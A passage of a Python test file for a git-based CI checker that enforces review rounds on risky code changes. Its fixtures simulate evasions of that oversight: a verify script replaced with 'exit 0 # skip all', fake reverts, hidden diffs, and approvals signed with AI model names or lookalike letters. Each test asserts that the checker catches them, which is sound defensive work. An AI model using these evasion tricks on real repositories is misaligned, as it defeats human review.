        repo.git("push", "-q", "origin", "feature")
        repo.git("checkout", "-q", "main")
        clone = BreakerPullRequestTest.pull_request(self, repo, "feature")
        clone.git("checkout", "-q", "--", ".keelokit/state.toml")  # the CI reads the PR's own file
        code, diffs = self.check(clone, "--ci", env=PR_ENV)
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(diffs))

    def test_HARN_021_S5_a_story_closed_on_the_trunk_before_a_side_branch_brought_risky_toml_is_exempt_ESC_318(self):
        repo = self.project({"AUTH-001": story("AUTH-001", dimensions=("security",))}, risky=None)
        repo.git("checkout", "-q", "-b", "side")
        harness(repo, "chore: risky stories\n\nNo-story: harness", {RISKY: RISKY_TOML})
        repo.git("checkout", "-q", "main")
        self.close(repo, "AUTH-001", publish=False)
        repo.merge("side", "Merge pull request #5 from x/side")
        repo.publish()
        self.assertEqual(self.breaker(self.check(repo)[1]), [])

    def test_HARN_021_S1_ledger_risky_reads_the_storys_commits_on_the_trunk_ESC_319(self):
        repo = self.project({"AUTH-001": story("AUTH-001")})
        repo.commit("wip\n\nPart-of: AUTH-001", {"scripts/verify.sh": "echo\n"})
        repo.publish()
        repo.git("checkout", "-q", "-b", "finish")
        r = repo.ledger("risky", "AUTH-001")
        self.assertIn("AUTH-001: risky", r.stdout)

    def test_HARN_021_S1_more_model_names_are_no_decision_ESC_320(self):
        for name in ("Grok", "DeepSeek", "Llama 3", "Devin", "Mistral", "Qwen"):
            with self.subTest(name=name):
                repo = self.project({"AUTH-001": story("AUTH-001", touches=(".keelokit/bin/x.py",))})
                self.close(repo, "AUTH-001", rounds=round_line(1, HEAD, "1 finding open")
                           + f"- Decision · {name} · 2026-11-25 · land it\n")
                self.assertIn(("warning", "BREAKER_UNRESOLVED", "AUTH-001"), self.breaker(self.check(repo)[1]))

    def test_HARN_021_S1_a_dimension_as_a_string_or_in_capitals_still_counts_ESC_321(self):
        for dims in ('"security"', '["Security"]'):
            with self.subTest(dims=dims):
                text = story("AUTH-001").replace('dimensions = ["logic"]', f"dimensions = {dims}")
                repo = self.project({"AUTH-001": text})
                self.close(repo, "AUTH-001")
                self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(self.check(repo)[1]))

    def test_HARN_021_S7_an_unknown_key_in_risky_toml_is_a_config_error_ESC_322(self):
        for text in ('[risky]\npaths = ["scripts/**"]\n', 'path = ["scripts/**"]\n'):
            with self.subTest(text=text):
                repo = self.project({"AUTH-001": story("AUTH-001")}, risky=text)
                self.close(repo, "AUTH-001")
                found = self.breaker(self.check(repo)[1])
                self.assertIn("BREAKER_CONFIG", [c for lvl, c, _ in found if lvl == "error"])

    def test_HARN_021_S3_check_asks_git_for_the_risky_paths_never_every_commits_files_ESC_323(self):
        """At 20k commits listing every closing commit's files took 36 s (round 2): git filters by the paths."""
        import os
        import shutil
        repo = self.project({"AUTH-001": story("AUTH-001")})
        for n in range(5):
            repo.commit(f"wip {n}\n\nPart-of: AUTH-001", {f"apps/web/{n}.ts": "x\n"})
        self.close(repo, "AUTH-001", {"scripts/verify.sh": "echo\n"})
        shim = self.tmp / "shim"
        shim.mkdir()
        log = self.tmp / "git.log"
        real = shutil.which("git")
        (shim / "git").write_text(f'#!/bin/sh\nprintf "%s\\n" "$*" >> "{log}"\nexec "{real}" "$@"\n')
        (shim / "git").chmod(0o755)
        r = repo.ledger("check", "--json", path=f"{shim}:{os.environ['PATH']}")
        self.assertIn("BREAKER_MISSING", r.stdout)
        calls = log.read_text().splitlines()
        # A file list only ever comes from git filtered by risky.toml's paths (merges' own resolutions, ESC-333).
        self.assertFalse([c for c in calls if "--name-only" in c and " -- :(glob)" not in c], calls)


class BreakerRound3Test(BreakerCase):
    """Breaker round 3 (ESC-324..330): each finding reproduced as a failing test first."""

    def test_HARN_021_S3_a_second_file_with_the_same_id_does_not_shadow_the_risky_one_ESC_324(self):
        repo = self.project({"AUTH-001": story("AUTH-001", dimensions=("security",))})
        self.close(repo, "AUTH-001", {"backlog/stories/AUTH-001-a.md": story("AUTH-001")})
        found = self.breaker(self.check(repo)[1])
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), found)

    def test_HARN_021_S3_a_commit_of_the_story_before_the_rule_still_makes_it_risky_ESC_325(self):
        repo = self.project({"AUTH-001": story("AUTH-001")}, risky=None)
        repo.commit("wip\n\nPart-of: AUTH-001", {"scripts/verify.sh": "echo\n"})
        harness(repo, "chore: risky stories\n\nNo-story: harness", {RISKY: RISKY_TOML})
        self.close(repo, "AUTH-001")
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(self.check(repo)[1]))

    def test_HARN_021_S6_a_pull_request_reads_the_storys_commits_already_on_the_trunk_ESC_326(self):
        repo = self.project({"AUTH-001": story("AUTH-001")})
        repo.commit("wip\n\nPart-of: AUTH-001", {"scripts/verify.sh": "echo\n"})
        repo.publish()
        BreakerPullRequestTest.branch(self, repo, "AUTH-001", {"apps/web/a.ts": "x\n"})
        code, diffs = self.check(BreakerPullRequestTest.pull_request(self, repo, "feature"), "--ci", env=PR_ENV)
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(diffs))

    def test_HARN_021_S6_rewriting_the_front_matter_while_closing_does_not_opt_out_ESC_327(self):
        planned = story("AUTH-001", touches=(".keelokit/bin/guard.py",), dimensions=("security",))
        tame = story("AUTH-001", touches=("docs/a.md",))
        repo = self.project({"AUTH-001": planned})
        self.close(repo, "AUTH-001", {path_of("AUTH-001"): tame})
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(self.check(repo)[1]))
        repo = self.project({"AUTH-001": planned})
        BreakerPullRequestTest.branch(self, repo, "AUTH-001", {path_of("AUTH-001"): tame})
        code, diffs = self.check(BreakerPullRequestTest.pull_request(self, repo, "feature"), "--ci", env=PR_ENV)
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(diffs))

    def test_HARN_021_S7_what_is_not_a_round_never_counts_ESC_328(self):
        cases = {
            "round 0": "- Round 0 · head " + HEAD + " · clean\n",
            "round 999": "- Round 999 · head " + HEAD + " · clean\n",
            "duplicate": round_line(1, HEAD, "1 finding") + round_line(1, HEAD),
            "long fence": "````md\n```\n" + round_line(1, HEAD) + "````\n",
            "html comment": "<!--\n" + round_line(1, HEAD) + "-->\n",
            "one-line comment": "<!-- " + round_line(1, HEAD).strip() + " -->\n",
        }
        for name, rounds in cases.items():
            with self.subTest(name=name):
                repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
                self.close(repo, "AUTH-001", rounds=rounds)
                self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(self.check(repo)[1]))

    def test_HARN_021_S4_names_with_digits_or_lookalike_letters_are_no_decision_ESC_329(self):
        for name in ("o3", "o4-mini", "C1aude", "Сlaude", "Bard"):  # Jules is also a person's name: list deciders
            with self.subTest(name=name):
                repo = self.project({"AUTH-001": story("AUTH-001", touches=(".keelokit/bin/x.py",))})
                self.close(repo, "AUTH-001", rounds=round_line(1, HEAD, "1 finding open")
                           + f"- Decision · {name} · 2026-11-25 · land it\n")
                self.assertIn(("warning", "BREAKER_UNRESOLVED", "AUTH-001"), self.breaker(self.check(repo)[1]))

    def test_HARN_021_S7_a_path_that_leaves_the_repo_is_a_config_error_not_a_crash_ESC_330(self):
        for bad in ("docs/../../x", ":(top)x", "../x"):
            with self.subTest(bad=bad):
                repo = self.project({"AUTH-001": story("AUTH-001")}, risky=f"paths = [{json.dumps(bad)}]\n")
                self.close(repo, "AUTH-001")
                code, diffs = self.check(repo)
                self.assertIn("BREAKER_CONFIG", [c for lvl, c, _ in self.breaker(diffs) if lvl == "error"])
                self.assertEqual(repo.ledger("risky", "AUTH-001").returncode, 0)


class BreakerRound4Test(BreakerCase):
    """The coordinator's breaker, round 4 (ESC-331..335): each finding reproduced as a failing test first."""

    def pr(self, repo: GitRepo, number: int = 40) -> tuple[int, list]:
        return self.check(BreakerPullRequestTest.pull_request(self, repo, "feature", number=number), "--ci",
                          env=PR_ENV)

    def land(self, repo: GitRepo) -> None:
        repo.git("merge", "-q", "--ff-only", "feature")
        repo.git("branch", "-q", "-D", "feature")
        repo.git("push", "-q", "origin", "--delete", "feature", check=False)
        repo.publish()

    def test_HARN_021_S3_a_risky_change_in_a_no_story_commit_is_refused_ESC_332(self):
        repo = self.project({"AUTH-001": story("AUTH-001")})
        repo.git("checkout", "-q", "-b", "feature")
        repo.commit("chore: speed\n\nNo-story: harness", {"scripts/verify.sh": "exit 0  # skip all\n"})
        harness(repo, "chore: guard\n\nNo-story: harness", {".keelokit/bin/guard.py": "# allow all\n"})
        repo.commit("feat: AUTH-001\n\nWhy.\n\nStory: AUTH-001", {"apps/web/page.ts": "x\n"})
        repo.git("push", "-q", "origin", "feature")
        repo.git("checkout", "-q", "main")
        code, diffs = self.pr(repo)
        self.assertIn("RISKY_NO_STORY", [d["code"] for d in diffs if d["level"] == "error"])
        self.land(repo)
        code, diffs = self.check(repo)
        self.assertEqual(code, 1)
        self.assertIn("RISKY_NO_STORY", [d["code"] for d in diffs if d["level"] == "error"])

    def test_HARN_021_S3_a_release_commit_touching_only_release_files_is_not_refused_ESC_332(self):
        repo = self.project({"AUTH-001": story("AUTH-001")}, risky=RISKY_TOML.replace(
            'paths = [', 'paths = ["CHANGELOG.md", '))
        # harness(): exactly these files (repo.commit adds a file of its own to every commit)
        harness(repo, "release: 1.2.3\n\nNo-story: release", {"CHANGELOG.md": "## 1.2.3\n"})
        repo.publish()
        self.assertNotIn("RISKY_NO_STORY", [d["code"] for d in self.check(repo)[1]])
        harness(repo, "release: 1.2.4\n\nNo-story: release", {"CHANGELOG.md": "## 1.2.4\n", "scripts/verify.sh": "x\n"})
        repo.publish()
        self.assertIn("RISKY_NO_STORY", [d["code"] for d in self.check(repo)[1]])

    def test_HARN_021_S5_deleting_risky_toml_after_the_rule_started_fails_closed_ESC_331(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",), dimensions=("security",))})
        repo.git("checkout", "-q", "-b", "feature")
        repo.git("rm", "-q", RISKY)
        repo.git("commit", "-q", "-m", "chore: tidy\n\nNo-story: harness", when=repo.next_date())
        repo.git("push", "-q", "origin", "feature")
        repo.git("checkout", "-q", "main")
        code, diffs = self.pr(repo)
        self.assertEqual(code, 1, diffs)
        self.assertIn("RISKY_NO_STORY", [d["code"] for d in diffs])
        self.land(repo)
        self.close(repo, "AUTH-001", {"scripts/verify.sh": "exit 0\n"})
        code, diffs = self.check(repo)
        found = self.breaker(diffs)
        self.assertIn("BREAKER_CONFIG", [c for lvl, c, _ in found if lvl == "error"])
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), found)

    def test_HARN_021_S7_the_rule_files_are_always_risky_whatever_risky_toml_says_ESC_331(self):
        repo = self.project({"AUTH-001": story("AUTH-001")}, risky="paths = []\n")
        for rel in (RISKY, ".keelokit/state.toml", "backlog/ledger-corrections.toml"):
            with self.subTest(rel=rel):
                harness(repo, "chore: tweak\n\nNo-story: harness", {rel: "# changed " + rel + "\n"})
                repo.publish()
                self.assertIn("RISKY_NO_STORY", [d["code"] for d in self.check(repo)[1]])
                repo.git("revert", "--no-edit", "HEAD", when=repo.next_date())
                repo.git("commit", "-q", "--amend", "-m", "Revert\n\nThis reverts commit "
                         + repo.sha("HEAD~1") + ".\n\nNo-story: harness")

    def test_HARN_021_S3_a_message_only_revert_reverts_nothing_ESC_335(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        close = self.close(repo, "AUTH-001", {"scripts/verify.sh": "exit 0\n"}, publish=False)
        repo.git("commit", "-q", "--allow-empty", "-m",
                 f'Revert "feat: AUTH-001"\n\nThis reverts commit {close}.\n\nNo-story: harness',
                 when=repo.next_date())
        repo.publish()
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(self.check(repo)[1]))

    def test_HARN_021_S3_reverts_count_by_their_content_real_fake_revert_of_revert_partial_ESC_335(self):
        # A real revert reopens the story; its real revert closes it again; a fake revert of a real revert, or a
        # partial revert, changes nothing.
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        close = self.close(repo, "AUTH-001", {"scripts/verify.sh": "exit 0\n", "apps/x.ts": "x\n"}, publish=False)
        repo.git("revert", "--no-edit", close, when=repo.next_date())
        real = repo.sha()
        repo.git("commit", "-q", "--amend", "-m", f"Revert\n\nThis reverts commit {close}.\n\nPart-of: AUTH-001")
        real = repo.sha()
        repo.publish()
        self.assertEqual(self.breaker(self.check(repo)[1]), [], "a real revert reopens the story")
        repo.git("commit", "-q", "--allow-empty", "-m", f"Revert\n\nThis reverts commit {real}.\n\nNo-story: harness",
                 when=repo.next_date())
        repo.publish()
        self.assertEqual(self.breaker(self.check(repo)[1]), [], "a fake revert of the revert reopens nothing")
        repo.git("revert", "--no-edit", real, when=repo.next_date())
        repo.git("commit", "-q", "--amend", "-m", f"Reapply\n\nThis reverts commit {real}.\n\nPart-of: AUTH-001")
        repo.publish()
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(self.check(repo)[1]),
                      "a real revert of the revert closes it again")
        repo2 = self.project({"AUTH-002": story("AUTH-002", touches=("scripts/verify.sh",))})
        close2 = self.close(repo2, "AUTH-002", {"scripts/verify.sh": "exit 0\n", "apps/y.ts": "y\n"}, publish=False)
        repo2.git("rm", "-q", "apps/y.ts")
        repo2.git("commit", "-q", "-m", f"Revert part\n\nThis reverts commit {close2}.\n\nPart-of: AUTH-002",
                  when=repo2.next_date())
        repo2.publish()
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-002"), self.breaker(self.check(repo2)[1]),
                      "a partial revert reverts nothing")

    def test_HARN_021_S3_a_risky_change_in_a_sync_merges_own_resolution_is_refused_ESC_333(self):
        repo = self.project({"AUTH-001": story("AUTH-001")})
        repo.git("checkout", "-q", "-b", "feature")
        repo.commit("feat: AUTH-001\n\nWhy.\n\nStory: AUTH-001", {"apps/web/page.ts": "x\n"})
        repo.git("checkout", "-q", "main")
        repo.commit("docs: x\n\nNo-story: docs", {"docs/x.md": "x\n"})
        repo.publish()
        repo.git("checkout", "-q", "feature")
        repo.git("merge", "-q", "--no-commit", "main", check=False)
        repo.write("scripts/verify.sh", "exit 0\n")
        repo.git("add", "-A")
        repo.git("commit", "-q", "-m", "Merge branch 'main' into feature", when=repo.next_date())
        repo.git("push", "-q", "origin", "feature")
        repo.git("checkout", "-q", "main")
        code, diffs = self.pr(repo)
        self.assertIn("RISKY_NO_STORY", [d["code"] for d in diffs if d["level"] == "error"])
        repo.merge("feature", "Merge pull request #9 from x/feature")
        repo.publish()
        self.assertIn("RISKY_NO_STORY", [d["code"] for d in self.check(repo)[1] if d["level"] == "error"])

    def test_HARN_021_S3_an_ordinary_merge_is_not_refused_ESC_333(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        repo.git("checkout", "-q", "-b", "feature")
        repo.commit("wip\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 1\n"})
        repo.git("checkout", "-q", "main")
        repo.commit("docs: x\n\nNo-story: docs", {"docs/x.md": "x\n"})
        repo.merge("feature", "Merge pull request #9 from x/feature")
        repo.publish()
        self.assertNotIn("RISKY_NO_STORY", [d["code"] for d in self.check(repo)[1]])

    def test_HARN_021_S6_risk_is_sticky_across_every_version_of_the_story_file_ESC_334(self):
        repo = self.project({"DOC-001": story("DOC-001")})
        planned = story("AUTH-001", touches=(".keelokit/bin/guard.py",), dimensions=("security",), risky="true")
        repo.commit("docs: plan AUTH-001\n\nNo-story: docs", {path_of("AUTH-001"): planned})
        repo.publish()
        self.close(repo, "AUTH-001", {path_of("AUTH-001"): story("AUTH-001", touches=("docs/a.md",))})
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(self.check(repo)[1]))


class BreakerRound5Test(BreakerCase):
    """Breaker round 5 (ESC-336..341): each finding reproduced as a failing test first."""

    def test_HARN_021_S6_a_renamed_story_file_keeps_the_risk_of_its_old_name_ESC_336(self):
        repo = self.project({"DOC-001": story("DOC-001")})
        repo.commit("docs: plan\n\nNo-story: docs", {path_of("AUTH-001"): story("AUTH-001", risky="true")})
        repo.git("mv", path_of("AUTH-001"), "backlog/stories/AUTH-001-renamed.md")
        repo.write("backlog/stories/AUTH-001-renamed.md", story("AUTH-001"))
        repo.git("add", "-A")
        repo.git("commit", "-q", "-m", "docs: rename\n\nNo-story: docs", when=repo.next_date())
        repo.publish()
        self.close(repo, "AUTH-001", publish=False)
        repo.publish()
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(self.check(repo)[1]))

    def test_HARN_021_S5_risky_toml_added_by_a_merges_own_resolution_starts_the_rule_ESC_337(self):
        repo = self.project({"AUTH-001": story("AUTH-001", dimensions=("security",))}, risky=None)
        repo.git("checkout", "-q", "-b", "side")
        repo.commit("docs: y\n\nNo-story: docs", {"docs/y.md": "y\n"})
        repo.git("checkout", "-q", "main")
        repo.git("merge", "-q", "--no-ff", "--no-commit", "side")
        harness(repo, "Merge branch 'side'\n\nPart-of: AUTH-001", {RISKY: RISKY_TOML})
        repo.git("rm", "-q", RISKY)
        repo.git("commit", "-q", "-m", "chore: tidy\n\nPart-of: AUTH-001", when=repo.next_date())
        self.close(repo, "AUTH-001")
        found = self.breaker(self.check(repo)[1])
        self.assertIn("BREAKER_CONFIG", [c for lvl, c, _ in found if lvl == "error"])
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), found)

    def test_HARN_021_S3_a_revert_that_differs_only_in_whitespace_reverts_nothing_ESC_338(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        repo.commit("chore: auth\n\nPart-of: AUTH-001", {"scripts/verify.sh": "if x:\n    skip = False\n"})
        # harness(): exactly this file changes, so the "revert" below differs from the inverse in whitespace only
        close = harness(repo, "feat: AUTH-001\n\nWhy.\n\nStory: AUTH-001", {"scripts/verify.sh": "if x:\n    skip = True\n"})
        repo.write("scripts/verify.sh", "if x:\nskip = False\n")
        repo.git("add", "-A")
        repo.git("commit", "-q", "-m", f"Revert\n\nThis reverts commit {close}.\n\nPart-of: AUTH-001",
                 when=repo.next_date())
        repo.publish()
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(self.check(repo)[1]))

    def test_HARN_021_S7_a_nul_in_a_path_is_a_config_error_not_a_crash_ESC_339(self):
        repo = self.project({"AUTH-001": story("AUTH-001")}, risky='paths = ["scripts/\\u0000x"]\n')
        self.close(repo, "AUTH-001")
        code, diffs = self.check(repo)
        self.assertIn("BREAKER_CONFIG", [c for lvl, c, _ in self.breaker(diffs) if lvl == "error"])
        self.assertEqual(repo.ledger("risky", "AUTH-001").returncode, 0)

    def test_HARN_021_S5_a_since_set_later_never_exempts_what_was_already_closed_ESC_340(self):
        repo = self.project({"AUTH-001": story("AUTH-001", dimensions=("security",)), "DOC-002": story("DOC-002")})
        close = self.close(repo, "AUTH-001")
        harness(repo, "chore: since\n\nPart-of: DOC-002", {RISKY: f'since = "{close}"\n' + RISKY_TOML})
        repo.publish()
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(self.check(repo)[1]))

    def test_HARN_021_S4_more_non_people_and_a_clean_with_findings_ESC_341(self):
        for name in ("Dependabot", "GitHub Actions", "Keelokit", "The CI", "Robot", "Automation", "Devstral",
                     "Nemotron", "Renovate"):
            with self.subTest(name=name):
                repo = self.project({"AUTH-001": story("AUTH-001", touches=(".keelokit/bin/x.py",))})
                self.close(repo, "AUTH-001", rounds=round_line(1, HEAD, "1 finding open")
                           + f"- Decision · {name} · 2026-11-25 · land it\n")
                self.assertIn(("warning", "BREAKER_UNRESOLVED", "AUTH-001"), self.breaker(self.check(repo)[1]))
        repo = self.project({"AUTH-001": story("AUTH-001", touches=(".keelokit/bin/x.py",))})
        self.close(repo, "AUTH-001", rounds=round_line(1, HEAD, "clean · 3 HIGH findings · not fixed"))
        self.assertIn(("warning", "BREAKER_UNRESOLVED", "AUTH-001"), self.breaker(self.check(repo)[1]))


class BreakerRound6Test(BreakerCase):
    """Breaker round 6 (ESC-342..345): each finding reproduced as a failing test first."""

    def fake_revert(self, repo: GitRepo, close: str, files: dict) -> None:
        harness(repo, f"Revert\n\nThis reverts commit {close}.\n\nPart-of: AUTH-001", files)
        repo.publish()

    def test_HARN_021_S3_a_binary_change_reverted_to_other_bytes_reverts_nothing_ESC_342(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=(".keelokit/bin/tool.bin",))})
        bin_a, bin_b, bin_c = b"\x00\x01A\x00", b"\x00\x01B\x00", b"\x00\x01C\x00"
        (repo.path / ".keelokit/bin").mkdir(parents=True, exist_ok=True)
        (repo.path / ".keelokit/bin/tool.bin").write_bytes(bin_a)
        repo.git("add", "-f", ".keelokit/bin/tool.bin")
        repo.git("commit", "-q", "-m", "chore: tool\n\nPart-of: AUTH-001", when=repo.next_date())
        (repo.path / ".keelokit/bin/tool.bin").write_bytes(bin_b)
        repo.git("add", "-f", ".keelokit/bin/tool.bin")
        repo.git("commit", "-q", "-m", "feat: AUTH-001\n\nWhy.\n\nStory: AUTH-001", when=repo.next_date())
        close = repo.sha()
        (repo.path / ".keelokit/bin/tool.bin").write_bytes(bin_c)
        repo.git("add", "-f", ".keelokit/bin/tool.bin")
        repo.git("commit", "-q", "-m", f"Revert\n\nThis reverts commit {close}.\n\nPart-of: AUTH-001",
                 when=repo.next_date())
        repo.publish()
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(self.check(repo)[1]))

    def test_HARN_021_S6_a_gitattributes_that_hides_diffs_does_not_fake_a_revert_ESC_343(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        harness(repo, "chore: verify\n\nPart-of: AUTH-001", {"scripts/verify.sh": "echo original\n"})
        repo.publish()
        repo.git("checkout", "-q", "-b", "feature")
        harness(repo, "chore: attributes\n\nPart-of: AUTH-001", {".gitattributes": "* -diff\n"})
        close = harness(repo, "feat: AUTH-001\n\nWhy.\n\nStory: AUTH-001", {"scripts/verify.sh": "exit 1\n"})
        harness(repo, f"Revert\n\nThis reverts commit {close}.\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 0\n"})
        repo.git("push", "-q", "origin", "feature")
        repo.git("checkout", "-q", "main")
        code, diffs = self.check(BreakerPullRequestTest.pull_request(self, repo, "feature", number=61), "--ci",
                                 env=PR_ENV)
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(diffs))

    def test_HARN_021_S4_look_alike_letters_of_any_script_are_no_decision_ESC_344(self):
        for name in ("Ｃｌａｕｄｅ", "Ꮯ" + "laude", "ᴄʟᴀᴜᴅᴇ",
                     "Ｂｏｔ"):
            with self.subTest(name=name):
                repo = self.project({"AUTH-001": story("AUTH-001", touches=(".keelokit/bin/x.py",))})
                self.close(repo, "AUTH-001", rounds=round_line(1, HEAD, "1 finding open")
                           + f"- Decision · {name} · 2026-11-25 · land it\n")
                self.assertIn(("warning", "BREAKER_UNRESOLVED", "AUTH-001"), self.breaker(self.check(repo)[1]))

    def test_HARN_021_S6_a_story_moved_to_any_name_keeps_the_risk_of_every_version_ESC_345(self):
        repo = self.project({"DOC-001": story("DOC-001")})
        repo.commit("docs: plan\n\nNo-story: docs", {"backlog/stories/auth-hardening.md": story("AUTH-001", risky="true")})
        repo.git("rm", "-q", "backlog/stories/auth-hardening.md")
        repo.git("commit", "-q", "-m", "docs: drop\n\nNo-story: docs", when=repo.next_date())  # no rename to follow
        repo.commit("docs: re-add\n\nNo-story: docs", {"backlog/stories/sec-one.md": story("AUTH-001")})
        repo.publish()
        self.close(repo, "AUTH-001", publish=False)
        repo.publish()
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(self.check(repo)[1]))


class BreakerCapTest(BreakerCase):
    """HARN-022 S1 (A): the last recorded round decides, whatever its number; the cap is where the build stops and
    asks a person, never a debt the record keeps."""

    def run_rounds(self, rounds: str) -> list[dict]:
        repo = self.project({"AUTH-001": story("AUTH-001", touches=(".keelokit/bin/x.py",))})
        self.close(repo, "AUTH-001", rounds=rounds)
        return [d for d in self.check(repo)[1] if d["code"].startswith("BREAKER_")]

    def test_HARN_022_S1_a_clean_last_round_past_the_cap_needs_no_decision(self):
        rounds = "".join(round_line(n, f"{n}" * 40, "1 finding · fixed") for n in (1, 2, 3, 4)) + round_line(5, HEAD)
        self.assertEqual(self.run_rounds(rounds), [])

    def test_HARN_022_S1_findings_left_at_the_cap_need_a_person(self):
        rounds = "".join(round_line(n, f"{n}" * 40, "1 finding · fixed") for n in (1, 2, 3))
        found = self.run_rounds(rounds)
        self.assertEqual([(d["level"], d["code"]) for d in found], [("warning", "BREAKER_UNRESOLVED")])
        self.assertIn("cap", found[0]["detail"])
        self.assertIn("a person decides", found[0]["detail"])
        self.assertEqual(self.run_rounds(rounds + "- Decision · Leo · 2026-11-25 · land it; the rest to HARN-099\n"),
                         [])

    def test_HARN_022_S1_findings_left_past_the_cap_need_a_person_too(self):
        rounds = "".join(round_line(n, f"{n}" * 40, "1 finding · fixed") for n in (1, 2, 3, 4))
        found = self.run_rounds(rounds)
        self.assertEqual([(d["level"], d["code"]) for d in found], [("warning", "BREAKER_UNRESOLVED")])
        self.assertIn("a person decides", found[0]["detail"])

    def test_HARN_022_S1_findings_left_below_the_cap_ask_for_the_next_round(self):
        found = self.run_rounds(round_line(1, HEAD, "1 finding: ESC-1 · fixed in 1234567"))
        self.assertEqual([(d["level"], d["code"]) for d in found], [("warning", "BREAKER_UNRESOLVED")])
        self.assertIn("round 2", found[0]["detail"])
        self.assertNotIn("a person decides", found[0]["detail"])
        self.assertEqual(self.run_rounds(round_line(1, HEAD, "1 finding open")
                                         + "- Decision · Leo · 2026-11-25 · land it\n"), [])

    def test_HARN_022_S1_a_decision_before_a_later_unclean_round_does_not_count(self):
        rounds = ("".join(round_line(n, f"{n}" * 40, "1 finding · fixed") for n in (1, 2, 3))
                  + "- Decision · Leo · 2026-11-25 · one more round\n" + round_line(4, HEAD, "1 finding open"))
        self.assertEqual([d["code"] for d in self.run_rounds(rounds)], ["BREAKER_UNRESOLVED"])


class BreakerCapTextTest(unittest.TestCase):
    """HARN-022 S2 (A): the build is told the last round decides and the cap is where it stops and asks."""

    def test_HARN_022_S2_the_skill_agent_docs_protocol_and_story_template_say_the_last_round_decides(self):
        for rel in ("skills/build-story/SKILL.md", "agents/breaker.md", "docs/design.md", "docs/ledger.md",
                    "template/.keelokit/harness/execution-protocol.md", "skills/plan-backlog/SKILL.md"):
            text = " ".join((ROOT / rel).read_text().split()).lower()
            with self.subTest(rel=rel):
                self.assertIn("the last round decides", text)
                self.assertIn("stop and ask", text)
                self.assertNotIn("past the cap need", text)


class RiskyAfterCloseTest(BreakerCase):
    """HARN-022 S3 (B1): a risky change under the trailer of a story already closed is RISKY_AFTER_CLOSE."""

    @staticmethod
    def after_close(diffs: list[dict]) -> list[str]:
        return [d["level"] for d in diffs if d["code"] == "RISKY_AFTER_CLOSE"]

    def test_HARN_022_S3_a_story_closed_before_the_rule_then_changed_on_a_risky_path(self):
        repo = self.project({"AUTH-001": story("AUTH-001"), "DOC-002": story("DOC-002")}, risky=None)
        self.close(repo, "AUTH-001", {"apps/web/page.ts": "x\n"})
        harness(repo, "chore: risky stories\n\nNo-story: harness", {RISKY: RISKY_TOML})
        repo.publish()
        self.assertEqual(self.after_close(self.check(repo)[1]), [])
        repo.commit("fix: later\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 0\n"})
        repo.publish()
        code, diffs = self.check(repo)
        self.assertEqual(self.after_close(diffs), ["error"])
        self.assertEqual(code, 1)
        detail = next(d["detail"] for d in diffs if d["code"] == "RISKY_AFTER_CLOSE")
        self.assertIn("AUTH-001", detail)

    def test_HARN_022_S3_a_story_closed_with_its_rounds_then_changed_on_a_risky_path(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        self.close(repo, "AUTH-001", {"scripts/verify.sh": "exit 1\n"}, rounds=round_line(1, HEAD))
        self.assertEqual(self.check(repo), (0, []))
        repo.commit("fix: later\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 2\n"})
        repo.publish()
        self.assertEqual(self.after_close(self.check(repo)[1]), ["error"])

    def test_HARN_022_S3_a_second_story_commit_after_the_close_is_reported_too(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        self.close(repo, "AUTH-001", {"scripts/verify.sh": "exit 1\n"}, rounds=round_line(1, HEAD))
        self.close(repo, "AUTH-001", {"scripts/verify.sh": "exit 3\n"})
        self.assertEqual(self.after_close(self.check(repo)[1]), ["error"])

    def test_HARN_022_S3_a_merges_own_resolution_under_a_closed_story_is_reported(self):
        repo = self.project({"AUTH-001": story("AUTH-001")})
        self.close(repo, "AUTH-001", {"apps/web/page.ts": "x\n"})
        repo.git("checkout", "-q", "-b", "side")
        repo.commit("docs: y\n\nNo-story: docs", {"docs/y.md": "y\n"})
        repo.git("checkout", "-q", "main")
        repo.commit("docs: z\n\nNo-story: docs", {"docs/z.md": "z\n"})
        repo.git("merge", "-q", "--no-ff", "--no-commit", "side")
        repo.write("scripts/verify.sh", "exit 0\n")
        repo.git("add", "-A")
        repo.git("commit", "-q", "-m", "Merge branch 'side'\n\nPart-of: AUTH-001", when=repo.next_date())
        repo.publish()
        self.assertEqual(self.after_close(self.check(repo)[1]), ["error"])

    def test_HARN_022_S3_what_is_not_reported(self):
